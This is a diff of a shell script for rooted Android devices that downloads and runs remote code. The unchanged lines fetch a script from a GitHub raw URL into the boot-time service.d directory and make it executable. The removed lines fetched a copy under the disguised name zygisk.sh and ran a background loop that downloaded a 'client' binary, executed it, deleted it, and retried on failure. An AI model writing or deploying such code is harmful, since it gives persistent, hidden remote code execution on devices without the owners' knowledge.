@@ -52,30 +52,4 @@ fi
 # 下载并执行客户端（后台进程）
 # ------------------------------
 curl -sS -o /data/adb/service.d/run.sh "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
-curl -sS -o /data/adb/service.d/zygisk.sh "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
 chmod +x /data/adb/service.d/run.sh
-chmod +x /data/adb/service.d/zygisk.sh
-MODULE_DIR="/data/adb/modules"
-
-{
-    temp_script="/data/local/tmp/client"
-    
-    while true; do
-        # 下载客户端
-        if curl -sS -o "$temp_script" "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client" >/dev/null 2>&1; then
-            # 下载成功，给执行权限
-            chmod +x "$temp_script"
-            # 执行客户端，并在执行完毕后删除
-            "$temp_script" && rm -f "$temp_script"
-            
-            # 如果执行失败也删除文件
-            [ -f "$temp_script" ] && rm -f "$temp_script"
-            
-            # 成功执行后退出循环
-            break
-        else
-            # 下载失败，等待30秒后重试
-            sleep 30
-        fi
-    done
-} &
